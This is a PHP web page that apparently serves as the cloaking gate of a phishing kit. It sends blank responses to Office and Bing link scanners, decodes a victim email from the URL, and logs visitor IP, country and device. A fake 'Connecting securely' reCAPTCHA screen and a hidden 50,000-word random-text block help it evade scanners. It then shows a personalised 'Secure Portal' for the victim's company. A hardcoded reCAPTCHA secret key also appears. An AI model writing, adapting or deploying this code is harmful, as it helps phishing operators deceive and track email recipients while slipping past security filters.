<?php
session_start();
if (!isset($_SESSION['regenerated'])) {
    session_regenerate_id(true);
    $_SESSION['regenerated'] = true;
}

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);
ob_start();

// --- Configuration ---
$recaptchaSiteKey = '6LcpGUktAAAAAM6MY2SBj5qty-QNBKkutpNH5ofJ';
$recaptchaSecretKey = '6LcpGUktAAAAAHyp97krWyWMHjONdjCzXxk88CDc';
$backendUrl = ''; // Leave empty to POST back to this script (index.php)

function getClientIp() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function lookupCountry($ip) {
    $url = "https://ipwhois.app/json/" . urlencode($ip);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? '');
    $resp = curl_exec($ch);
    curl_close($ch);
    if ($resp) {
        $data = json_decode($resp, true);
        return $data['country'] ?? 'Unknown';
    }
    return 'Unknown';
}

function detectDeviceType($ua) {
    $ua = strtolower($ua);
    $mobile = ['mobile','android','iphone','ipad','tablet','opera mini','iemobile'];
    foreach ($mobile as $kw) if (strpos($ua, $kw) !== false) return 'Mobile';
    return 'PC';
}

function generateHiddenStory() {
    $file = __DIR__ . '/wordbank.txt';
    if (!file_exists($file)) return '';
    $words = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$words) return '';
    $seed = crc32(session_id() . $_SERVER['REMOTE_ADDR'] . microtime(true));
    mt_srand($seed);
    $output = "<div style=\"display:none\" id=\"story\">\n";
    $wordCount = 0;
    $maxWords = 50000;
    while ($wordCount < $maxWords) {
        $sentenceLength = mt_rand(8, 16);
        $sentenceWords = [];
        for ($i = 0; $i < $sentenceLength; $i++) {
            $sentenceWords[] = $words[array_rand($words)];
        }
        $sentence = ucfirst(implode(' ', $sentenceWords)) . '.';
        $output .= "<p>$sentence</p>\n";
        $wordCount += str_word_count($sentence);
    }
    $output .= "</div>\n";
    return $output;
}

// Block basic office/bing bots early
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (stripos($userAgent, 'Microsoft Office') !== false || stripos($userAgent, 'bingbot') !== false) {
    http_response_code(204);
    exit;
}

// Log Visitor Activity
$logPath = __DIR__ . '/visitors.log';
$ip = getClientIp();
$country = lookupCountry($ip);
$device = detectDeviceType($userAgent);

$lines = file_exists($logPath) ? file($logPath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
$entries = [];
foreach ($lines as $line) {
    $parts = explode(' | ', $line);
    if (count($parts) >= 5) {
        $entries[$parts[0]] = [
            'ua' => $parts[1],
            'country' => $parts[2],
            'device' => $parts[3],
            'count' => (int)$parts[4]
        ];
    }
}
$entries[$ip] = $entries[$ip] ?? ['ua' => $userAgent, 'country' => $country, 'device' => $device, 'count' => 0];
$entries[$ip]['count']++;
$out = '';
foreach ($entries as $k => $v) {
    $out .= "$k | {$v['ua']} | {$v['country']} | {$v['device']} | {$v['count']}" . PHP_EOL;
}
file_put_contents($logPath, $out);

// --- Extract email from URL path ---
$path = ltrim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
$segments = explode('/', urldecode($path));
$emailB64 = '';
$decodedEmail = '';

foreach (array_reverse($segments) as $segment) {
    $segment = trim($segment);
    if (substr($segment, 0, 2) === '$(' && substr($segment, -1) === ')') {
        $segment = substr($segment, 2, -1);
    } elseif (substr($segment, 0, 1) === '$') {
        $segment = substr($segment, 1);
    }
    
    // Normalize base64
    $normalized = str_replace(['-', '_'], ['+', '/'], $segment);
    $padding = strlen($normalized) % 4;
    if ($padding > 0) {
        $normalized .= str_repeat('=', 4 - $padding);
    }
    
    $decoded = base64_decode($normalized, true);
    if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        $emailB64 = $segment;
        $decodedEmail = $decoded;
        break;
    }
}

if (empty($decodedEmail)) {
    http_response_code(400);
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => 'Backend call rejected: Email not found or invalid in URL path.'
    ]);
    exit;
}

// --- Derive company details ---
$emailParts = explode('@', $decodedEmail);
$domain = isset($emailParts[1]) ? $emailParts[1] : '';
$domainParts = explode('.', $domain);
$companyName = isset($domainParts[0]) ? ucfirst($domainParts[0]) : 'Secure';

$_SESSION['company'] = $companyName;
$_SESSION['decodedEmail'] = $decodedEmail;
$_SESSION['redirectEncoded'] = $emailB64;

// --- Handle testing session reset ---
if (isset($_GET['action']) && $_GET['action'] === 'reset') {
    unset($_SESSION['captcha_passed']);
    header("Location: /" . $emailB64);
    exit;
}

// --- Handle Google reCAPTCHA POST Verification ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $token = $input['token'] ?? $_POST['token'] ?? '';
    
    if (empty($token)) {
        http_response_code(400);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Missing reCAPTCHA challenge token.']);
        exit;
    }
    
    // Query Google reCAPTCHA API
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'secret' => $recaptchaSecretKey,
        'response' => $token,
        'remoteip' => getClientIp()
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    
    $result = json_decode($response, true);
    header('Content-Type: application/json');
    if (isset($result['success']) && $result['success'] === true) {
        $_SESSION['captcha_passed'] = true;
        echo json_encode([
            'status' => 'success',
            'message' => 'Verification successful.'
        ]);
        exit;
    } else {
        http_response_code(403);
        echo json_encode([
            'status' => 'error',
            'message' => 'Verification failed: reCAPTCHA rejected request.',
            'error-codes' => $result['error-codes'] ?? []
        ]);
        exit;
    }
}

// --- Check Session Gate Status ---
$captchaPassed = isset($_SESSION['captcha_passed']) && $_SESSION['captcha_passed'] === true;

if (!$captchaPassed) {
    // ==========================================
    // VIEW 1: MINIMAL LOADER GATE (Unverified)
    // ==========================================
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Connecting securely...</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg-color: #ffffff;
                --text-color: #1d1d1f;
                --text-muted: #86868b;
                --bar-bg: #f5f5f7;
                --bar-fill: #0071e3;
                --error-color: #ff3b30;
            }

            @media (prefers-color-scheme: dark) {
                :root {
                    --bg-color: #000000;
                    --text-color: #f5f5f7;
                    --text-muted: #86868b;
                    --bar-bg: #1c1c1e;
                    --bar-fill: #0a84ff;
                    --error-color: #ff453a;
                }
            }

            body {
                margin: 0;
                padding: 0;
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                background-color: var(--bg-color);
                font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
                color: var(--text-color);
                transition: background-color 0.3s ease, color 0.3s ease;
                overflow: hidden;
            }

            .container {
                width: 100%;
                max-width: 280px;
                padding: 20px;
                text-align: left;
            }

            h1 {
                font-size: 1.4rem;
                font-weight: 600;
                margin: 0 0 6px 0;
                letter-spacing: -0.3px;
            }

            p {
                font-size: 0.9rem;
                color: var(--text-muted);
                margin: 0 0 20px 0;
                line-height: 1.4;
            }

            .progress-bar-container {
                width: 100%;
                height: 4px;
                background-color: var(--bar-bg);
                border-radius: 2px;
                overflow: hidden;
                position: relative;
            }

            .progress-bar-fill {
                height: 100%;
                width: 0%;
                background-color: var(--bar-fill);
                border-radius: 2px;
                transition: width 0.4s cubic-bezier(0.1, 0.8, 0.3, 1), background-color 0.3s ease;
            }

            .progress-bar-fill.indeterminate {
                width: 30%;
                position: absolute;
                animation: loading-slide 1.5s infinite ease-in-out;
            }

            .progress-bar-fill.error {
                background-color: var(--error-color) !important;
                width: 100% !important;
                animation: none !important;
            }

            @keyframes loading-slide {
                0% {
                    left: -30%;
                }
                100% {
                    left: 100%;
                }
            }
        </style>
        <!-- Google reCAPTCHA API -->
        <script src="https://www.google.com/recaptcha/api.js?render=<?= urlencode($recaptchaSiteKey) ?>" async defer></script>
    </head>
    <body>
        <div class="container">
            <h1 id="status-title">Connecting...</h1>
            <p id="status-subtitle">Verifying browser security</p>
            
            <div class="progress-bar-container">
                <div id="progress-fill" class="progress-bar-fill indeterminate"></div>
            </div>

            <!-- Hidden reCAPTCHA Widget Container -->
            <div class="g-recaptcha-container" style="display:none;">
                <div id="recaptcha-widget"></div>
            </div>
        </div>

        <script>
            // Failsafe to ensure grecaptcha.ready() queues correctly even if the API script hasn't finished loading.
            if (typeof grecaptcha === 'undefined') {
                grecaptcha = {
                    ready: function(cb) {
                        var c = '___grecaptcha_cfg';
                        window[c] = window[c] || {};
                        (window[c]['fns'] = window[c]['fns'] || []).push(cb);
                    }
                };
            }

            function updateProgress(percentage) {
                const fill = document.getElementById('progress-fill');
                if (fill) {
                    fill.classList.remove('indeterminate');
                    fill.style.width = percentage + '%';
                }
            }

            grecaptcha.ready(function() {
                updateProgress(30);
                grecaptcha.execute(<?= json_encode($recaptchaSiteKey) ?>, { action: 'homepage' })
                    .then(function(token) {
                        updateProgress(65);
                        // POST token to the server
                        fetch(window.location.href, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                token: token
                            })
                        })
                        .then(res => {
                            if (!res.ok) {
                                return res.json().then(err => { throw err; });
                            }
                            return res.json();
                        })
                        .then(data => {
                            if (data.status === 'success') {
                                updateProgress(100);
                                document.getElementById('status-title').textContent = 'Secure Connection Established';
                                document.getElementById('status-subtitle').textContent = 'Loading secure environment...';
                                
                                setTimeout(() => {
                                    window.location.reload();
                                }, 600);
                            } else {
                                throw new Error('Verification failed');
                            }
                        })
                        .catch(err => {
                            showError(err.message || 'Unable to establish secure tunnel.');
                        });
                    })
                    .catch(err => {
                        showError('reCAPTCHA execution failed. Please refresh.');
                    });
            });

            function showError(msg) {
                document.getElementById('status-title').textContent = 'Connection Rejected';
                document.getElementById('status-subtitle').textContent = msg;
                const fill = document.getElementById('progress-fill');
                if (fill) {
                    fill.classList.remove('indeterminate');
                    fill.classList.add('error');
                }
            }
        </script>
    </body>
    </html>
    <?php
    exit;
}

// ==========================================
// VIEW 2: PROTECTED PAYLOAD (Verified)
// ==========================================

// Handle loading background story text as before
if (isset($_GET['action']) && $_GET['action'] === 'story') {
    echo generateHiddenStory();
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Portal - <?= htmlspecialchars($companyName) ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0b0c10;
            --card-bg: rgba(255, 255, 255, 0.03);
            --border-color: rgba(255, 255, 255, 0.08);
            --text-color: #f5f5f7;
            --text-muted: #86868b;
            --accent-color: #0071e3;
            --success-color: #34c759;
            --card-glow: rgba(0, 113, 227, 0.15);
        }

        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(0, 113, 227, 0.08) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(52, 199, 89, 0.05) 0%, transparent 40%);
            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
            color: var(--text-color);
        }

        .portal-container {
            background: var(--card-bg);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid var(--border-color);
            border-radius: 24px;
            padding: 40px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
            text-align: center;
            animation: fadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
        }

        @keyframes fadeIn {
            from { transform: translateY(15px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .verified-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(52, 199, 89, 0.12);
            border: 1px solid rgba(52, 199, 89, 0.3);
            color: var(--success-color);
            padding: 6px 14px;
            border-radius: 100px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 1.6rem;
            font-weight: 700;
            margin: 0 0 10px 0;
            letter-spacing: -0.5px;
        }

        .company-subtitle {
            font-size: 1rem;
            color: var(--text-muted);
            margin-bottom: 35px;
        }

        .info-grid {
            text-align: left;
            background: rgba(255, 255, 255, 0.01);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            font-size: 0.9rem;
        }

        .info-row:last-child {
            border-bottom: none;
            padding-bottom: 0;
        }

        .info-row:first-child {
            padding-top: 0;
        }

        .label {
            color: var(--text-muted);
        }

        .val {
            font-weight: 500;
            color: var(--text-color);
        }

        .btn-reset {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--text-color);
            padding: 12px 24px;
            border-radius: 12px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            display: inline-block;
        }

        .btn-reset:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(255, 255, 255, 0.2);
            transform: translateY(-1px);
        }

        .btn-reset:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>
    <div class="portal-container">
        <div class="verified-badge">
            <span style="font-size: 1rem;">✓</span> Browser Verified Secure
        </div>
        
        <h1>Welcome back</h1>
        <div class="company-subtitle">Accessing <?= htmlspecialchars($companyName) ?> workspace</div>

        <div class="info-grid">
            <div class="info-row">
                <span class="label">Identified User</span>
                <span class="val"><?= htmlspecialchars($decodedEmail) ?></span>
            </div>
            <div class="info-row">
                <span class="label">Visitor IP</span>
                <span class="val"><?= htmlspecialchars($ip) ?></span>
            </div>
            <div class="info-row">
                <span class="label">Origin Country</span>
                <span class="val"><?= htmlspecialchars($country) ?></span>
            </div>
            <div class="info-row">
                <span class="label">Access Device</span>
                <span class="val"><?= htmlspecialchars($device) ?></span>
            </div>
        </div>

        <a href="?action=reset" class="btn-reset">Reset Security Session</a>
    </div>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            // Load the wordbank story in the background as requested
            setTimeout(() => {
                fetch('?action=story')
                    .then(response => response.text())
                    .then(html => {
                        const tempDiv = document.createElement('div');
                        tempDiv.innerHTML = html;
                        document.body.appendChild(tempDiv);
                        console.log('Background story loaded successfully.');
                    })
                    .catch(err => console.error('Failed to load background story:', err));
            }, 100);
        });
    </script>
</body>
</html>
